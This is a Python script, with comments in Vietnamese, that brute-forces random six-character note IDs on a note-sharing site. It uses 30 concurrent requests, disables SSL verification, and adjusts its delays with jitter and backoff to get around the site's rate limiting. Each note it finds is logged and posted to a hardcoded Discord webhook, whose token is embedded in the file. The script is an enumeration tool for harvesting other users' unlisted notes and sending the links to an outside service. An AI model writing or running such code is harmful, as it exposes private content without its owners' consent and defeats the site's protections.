# ================= AUTO INSTALL =================
import subprocess, sys
def pip_install(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except: pass

required = {"aiohttp": "aiohttp>=3.9.0", "aiofiles": "aiofiles"}
for m, p in required.items():
    try: __import__(m)
    except ImportError: pip_install(p)
# =================================================

import asyncio
import aiohttp
import aiofiles
import random
import string
import os
import time
from datetime import datetime, timedelta
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor

# ========== CONFIG ==========
BASE_URL = "https://snote.vip/notes/"
CONCURRENT = 30  # Tăng từ 10 lên 30 threads
CODE_LENGTH = 6
CHARSET = string.ascii_uppercase + string.digits

DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1444536629623656543/zNHlASTocFTzq0EmhPYbY1JHIUdf1NjoeFcfLZlD0kp6HtGOWYOUKMxuCsbzCYKt6yJZ"

CHECKED_FILE = "checked_urls.txt"
LOG_DIR = "logs"
VALID_FILE = os.path.join(LOG_DIR, "all_valid_links.txt")
ERROR_LOG = os.path.join(LOG_DIR, "errors.log")

# Adaptive Rate Limiting
checked_urls = set()
file_lock = asyncio.Lock()
rate_limit_lock = asyncio.Lock()

stats = {
    "scan": 0, 
    "found": 0, 
    "errors": 0,
    "rate_limited": 0,
    "start_time": time.time()
}

# Adaptive delay (tự động điều chỉnh)
adaptive_delay = {"min": 0.2, "max": 1.2, "current": 0.5}
rate_limit_hits = defaultdict(int)


# ========== Helper Functions ==========
def gen_code():
    return "".join(random.choices(CHARSET, k=CODE_LENGTH))

def ensure_log_dir():
    os.makedirs(LOG_DIR, exist_ok=True)

def get_elapsed_time():
    elapsed = time.time() - stats["start_time"]
    return f"{int(elapsed // 3600)}h {int((elapsed % 3600) // 60)}m {int(elapsed % 60)}s"

def get_scan_rate():
    elapsed = time.time() - stats["start_time"]
    if elapsed > 0:
        return stats["scan"] / elapsed
    return 0

async def append_line(fp, text):
    folder = os.path.dirname(fp)
    if folder: 
        os.makedirs(folder, exist_ok=True)
    async with file_lock:
        try:
            async with aiofiles.open(fp, "a", encoding="utf-8") as f:
                await f.write(text + "\n")
        except Exception as e:
            await append_error(f"Lỗi lưu file {fp}: {e}")

async def append_error(text):
    msg = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {text}"
    async with file_lock:
        try:
            async with aiofiles.open(ERROR_LOG, "a", encoding="utf-8") as f:
                await f.write(msg + "\n")
        except:
            pass

async def notify(url):
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(DISCORD_WEBHOOK_URL, json={"content": url}, timeout=5)
    except:
        pass

async def adjust_rate_limit():
    """Tự động điều chỉnh delay dựa trên tần suất rate limit"""
    async with rate_limit_lock:
        rate_limited_percent = stats["rate_limited"] / max(stats["scan"], 1) * 100
        
        if rate_limited_percent > 20:  # Nếu >20% bị limit
            adaptive_delay["current"] = min(adaptive_delay["current"] * 1.5, adaptive_delay["max"])
        elif rate_limited_percent < 5:  # Nếu <5% bị limit
            adaptive_delay["current"] = max(adaptive_delay["current"] * 0.95, adaptive_delay["min"])

async def intelligent_delay():
    """Delay thông minh với jitter"""
    delay = random.uniform(
        adaptive_delay["current"] * 0.7,
        adaptive_delay["current"] * 1.3
    )
    await asyncio.sleep(delay)


# ========== Scanner ==========
async def scan_one(session, retries=3):
    """Scan một URL với retry logic và adaptive delay"""
    code = gen_code()
    url = BASE_URL + code
    
    if url in checked_urls:
        return
    
    checked_urls.add(url)
    await append_line(CHECKED_FILE, url)
    
    # Intelligent delay trước mỗi request
    await intelligent_delay()
    
    for attempt in range(retries):
        try:
            async with session.get(url, timeout=8, ssl=False) as res:
                stats["scan"] += 1
                
                # 200 = URL hợp lệ ✔
                if res.status == 200:
                    stats["found"] += 1
                    log_msg = f"✔ [{stats['found']}] VALID: {url}"
                    print(log_msg)
                    await append_line(VALID_FILE, url)
                    await notify(url)
                    return
                
                # 429, 503, 502 = Rate limit hoặc server busy → retry
                elif res.status in (429, 503, 502):
                    stats["rate_limited"] += 1
                    if attempt < retries - 1:
                        backoff = (2 ** attempt) * 0.5  # Exponential backoff
                        await asyncio.sleep(backoff)
                        continue
                    else:
                        await adjust_rate_limit()
                        print(f"⛔ RATE LIMIT: {url} — Tăng delay")
                        return
                
                # 403, 401 = Forbidden/Unauthorized
                elif res.status in (403, 401):
                    return
                
                # Các status khác (404, etc) = không hợp lệ
                else:
                    return
        
        except asyncio.TimeoutError:
            stats["errors"] += 1
            if attempt < retries - 1:
                await asyncio.sleep(0.3)
                continue
            else:
                await append_error(f"Timeout sau {retries} lần thử: {url}")
                return
        
        except Exception as e:
            stats["errors"] += 1
            if attempt < retries - 1:
                await asyncio.sleep(0.2)
                continue
            else:
                await append_error(f"Lỗi bất ngờ: {url} - {str(e)}")
                return

async def print_stats():
    """In thống kê hiệu suất"""
    while True:
        await asyncio.sleep(30)  # In stats mỗi 30 giây
        scan_rate = get_scan_rate()
        elapsed = get_elapsed_time()
        rate_limited_percent = (stats["rate_limited"] / max(stats["scan"], 1) * 100) if stats["scan"] > 0 else 0
        
        print(f"""
╔════════════════════════════════════════╗
║ 📊 THỐNG KÊ HIỆU NĂNG                   ║
├────────────────────────────────────────┤
║ ⏱️  Thời gian:    {elapsed:<25} ║
║ 🔍 Đã quét:       {stats['scan']:<25} ║
║ ✔  Tìm được:      {stats['found']:<25} ║
║ ⚠️  Rate limit:    {stats['rate_limited']:<25} ║
║ ❌ Lỗi:           {stats['errors']:<25} ║
║ 📈 Tốc độ:        {scan_rate:<13.2f} URLs/sec        ║
║ ⏳ Delay hiện tại: {adaptive_delay['current']:<13.3f} seconds      ║
║ 📊 % Bị limit:    {rate_limited_percent:<13.1f}%               ║
╚════════════════════════════════════════╝
""")


# ========== Main Loop ==========
async def main():
    ensure_log_dir()
    print("🚀 Scanner UPGRADED START!")
    print(f"⚙️  Threads: {CONCURRENT}, Code Length: {CODE_LENGTH}")
    print(f"🌐 Base URL: {BASE_URL}\n")
    
    # Tạo session với connection pooling tốt hơn
    connector = aiohttp.TCPConnector(
        limit=CONCURRENT + 10,
        limit_per_host=CONCURRENT,
        ttl_dns_cache=300,
        ssl=False
    )
    timeout = aiohttp.ClientTimeout(total=15, connect=8, sock_read=8)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Tạo tasks cho stats printer và scanner
        scanner_task = asyncio.create_task(scanner_loop(session))
        stats_task = asyncio.create_task(print_stats())
        
        try:
            await asyncio.gather(scanner_task, stats_task)
        except KeyboardInterrupt:
            print("\n🛑 STOP bởi user")
            scanner_task.cancel()
            stats_task.cancel()

async def scanner_loop(session):
    """Vòng lặp scanner chính"""
    while True:
        # Tạo một batch của CONCURRENT tasks
        tasks = [scan_one(session) for _ in range(CONCURRENT)]
        
        # Chạy song song
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Điều chỉnh rate limit sau mỗi batch
        await adjust_rate_limit()
        
        # Tránh CPU 100%
        await asyncio.sleep(0.1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 STOPPED")